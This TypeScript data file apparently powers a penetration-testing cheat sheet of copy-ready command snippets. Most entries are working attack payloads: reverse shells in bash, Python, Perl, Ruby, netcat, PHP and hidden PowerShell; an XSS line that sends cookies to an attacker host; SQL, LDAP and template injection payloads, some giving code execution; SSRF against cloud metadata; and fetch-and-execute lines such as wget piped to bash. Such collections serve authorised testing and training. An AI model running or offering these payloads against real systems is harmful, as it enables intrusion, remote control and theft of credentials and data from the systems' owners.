export type SnippetCategory =
  | "reverse-shell"
  | "web-payload"
  | "linux-enum"
  | "windows-enum"
  | "file-transfer"
  | "utility";

export interface Snippet {
  id: string;
  category: SnippetCategory;
  title: string;
  body: string;
  hint?: string;
}

export const SNIPPETS: Snippet[] = [
  // ── reverse-shell ──────────────────────────────────────────────────────────
  {
    id: "revshell-bash-tcp",
    category: "reverse-shell",
    title: "Bash TCP reverse shell",
    body: "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1",
    hint: "most common · requires bash ≥4",
  },
  {
    id: "revshell-bash-196",
    category: "reverse-shell",
    title: "Bash 196 reverse shell",
    body: "exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196",
    hint: "uses exec fd 196",
  },
  {
    id: "revshell-python3",
    category: "reverse-shell",
    title: "Python3 reverse shell",
    body: 'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("$LHOST",$LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")\'',
    hint: "spawns pty",
  },
  {
    id: "revshell-python2",
    category: "reverse-shell",
    title: "Python2 reverse shell",
    body: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])\'',
    hint: "legacy python2",
  },
  {
    id: "revshell-perl",
    category: "reverse-shell",
    title: "Perl reverse shell",
    body: 'perl -e \'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}\'',
  },
  {
    id: "revshell-ruby",
    category: "reverse-shell",
    title: "Ruby reverse shell",
    body: 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("$LHOST",$LPORT);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'',
  },
  {
    id: "revshell-nc-e",
    category: "reverse-shell",
    title: "Netcat (with -e) reverse shell",
    body: "nc -e /bin/bash $LHOST $LPORT",
    hint: "requires nc with -e flag (traditional/openbsd)",
  },
  {
    id: "revshell-nc-mkfifo",
    category: "reverse-shell",
    title: "Netcat (no -e) mkfifo shell",
    body: "rm /tmp/p; mkfifo /tmp/p; cat /tmp/p | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/p",
    hint: "works with any nc build",
  },
  {
    id: "revshell-powershell-iex",
    category: "reverse-shell",
    title: "PowerShell IEX reverse shell",
    body: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'$LHOST\',$LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',
    hint: "Windows · IEX style",
  },
  {
    id: "revshell-php",
    category: "reverse-shell",
    title: "PHP reverse shell (one-liner)",
    body: 'php -r \'$sock=fsockopen("$LHOST",$LPORT);exec("/bin/sh -i <&3 >&3 2>&3");\'',
    hint: "web-accessible or CLI",
  },
  // ── web-payload ────────────────────────────────────────────────────────────
  {
    id: "web-xss-basic",
    category: "web-payload",
    title: "XSS basic alert",
    body: "<script>alert(document.domain)</script>",
    hint: "domain-scoped PoC",
  },
  {
    id: "web-xss-cookie-steal",
    category: "web-payload",
    title: "XSS cookie exfiltration",
    body: "<script>fetch('http://$LHOST/?c='+document.cookie)</script>",
    hint: "exfil to collaborator",
  },
  {
    id: "web-sqli-union-mysql",
    category: "web-payload",
    title: "SQLi MySQL UNION skeleton",
    body: "' UNION SELECT null,null,null-- -",
    hint: "adjust column count · null-probe first",
  },
  {
    id: "web-sqli-blind-boolean",
    category: "web-payload",
    title: "SQLi blind boolean",
    body: "' AND 1=1-- -",
    hint: "swap 1=2 to confirm blind",
  },
  {
    id: "web-ssti-jinja2",
    category: "web-payload",
    title: "SSTI Jinja2 RCE",
    body: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    hint: "Flask/Jinja2",
  },
  {
    id: "web-ssti-twig",
    category: "web-payload",
    title: "SSTI Twig RCE",
    body: "{{['id']|filter('system')}}",
    hint: "PHP Twig template engine",
  },
  {
    id: "web-ssrf-aws-imds",
    category: "web-payload",
    title: "SSRF AWS IMDSv1",
    body: "http://169.254.169.254/latest/meta-data/",
    hint: "follow with iam/security-credentials/",
  },
  {
    id: "web-ldap-injection",
    category: "web-payload",
    title: "LDAP injection wildcard",
    body: "*)(uid=*))(|(uid=*",
    hint: "bypass attribute filter",
  },
  // ── linux-enum ─────────────────────────────────────────────────────────────
  {
    id: "linux-linpeas",
    category: "linux-enum",
    title: "LinPEAS one-liner",
    body: "curl -s https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
    hint: "requires curl + internet",
  },
  {
    id: "linux-suid-find",
    category: "linux-enum",
    title: "Find SUID binaries",
    body: "find / -perm -4000 -type f 2>/dev/null",
    hint: "compare with gtfobins.github.io",
  },
  {
    id: "linux-writable-cron",
    category: "linux-enum",
    title: "Find writable cron files",
    body: "find /etc/cron* /var/spool/cron* -writable -type f 2>/dev/null",
    hint: "check /etc/crontab owner too",
  },
  {
    id: "linux-world-writable",
    category: "linux-enum",
    title: "Find world-writable files",
    body: "find / -perm -o+w -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null",
  },
  {
    id: "linux-kernel-info",
    category: "linux-enum",
    title: "Kernel + OS release info",
    body: "uname -a; cat /etc/*-release 2>/dev/null",
    hint: "map to known local exploits",
  },
  // ── windows-enum ───────────────────────────────────────────────────────────
  {
    id: "windows-systeminfo",
    category: "windows-enum",
    title: "systeminfo (kernel + patches)",
    body: "systeminfo",
    hint: "pipe to wes.py / wesng for CVEs",
  },
  {
    id: "windows-powerview",
    category: "windows-enum",
    title: "PowerView domain enum one-liner",
    body: "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Get-Domain",
    hint: "runs in-memory; no disk artefact",
  },
  {
    id: "windows-whoami-priv",
    category: "windows-enum",
    title: "whoami /priv",
    body: "whoami /priv",
    hint: "look for SeImpersonatePrivilege",
  },
  // ── file-transfer ──────────────────────────────────────────────────────────
  {
    id: "ft-python-http",
    category: "file-transfer",
    title: "Python HTTP server",
    body: "python3 -m http.server $PORT",
    hint: "serves cwd on 0.0.0.0:PORT",
  },
  {
    id: "ft-curl-upload",
    category: "file-transfer",
    title: "curl upload (POST)",
    body: "curl -X POST http://$LHOST:$LPORT/upload -F 'file=@/path/to/file'",
    hint: "pair with python -m uploadserver",
  },
  {
    id: "ft-wget",
    category: "file-transfer",
    title: "wget to stdout",
    body: "wget -q -O - http://$LHOST:$PORT/file.sh | bash",
    hint: "fetch and exec",
  },
  {
    id: "ft-base64-encode",
    category: "file-transfer",
    title: "Base64 transfer (encode side)",
    body: "base64 -w 0 /path/to/file && echo",
    hint: "copy output; decode with ft-base64-decode",
  },
  {
    id: "ft-base64-decode",
    category: "file-transfer",
    title: "Base64 transfer (decode side)",
    body: "echo 'BASE64_HERE' | base64 -d > /tmp/file",
    hint: "paste encoded output from ft-base64-encode",
  },
  // ── utility ────────────────────────────────────────────────────────────────
  {
    id: "util-find-large",
    category: "utility",
    title: "Find files larger than 100 MB",
    body: "find . -type f -size +100M",
  },
  {
    id: "util-lsof-port",
    category: "utility",
    title: "Show process on port",
    body: "lsof -i :$PORT",
    hint: "macOS + Linux",
  },
];
